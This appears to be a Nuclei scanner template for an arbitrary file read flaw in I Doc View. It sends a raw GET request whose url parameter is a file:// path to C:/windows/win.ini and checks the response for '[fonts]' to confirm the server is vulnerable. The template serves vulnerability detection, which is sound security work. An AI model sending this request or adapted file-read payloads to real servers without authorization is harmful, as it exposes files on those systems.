id: idocview-qjvqhft-fileread

info:
  name: I Doc View /view/qJvqhFt.json 接口任意文件读取
  author: SleepingBag945
  severity: high


http:
  - raw:
      - |
        GET /view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
        Connection: close
        Accept-Encoding: gzip, deflate, br

    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"[fonts]")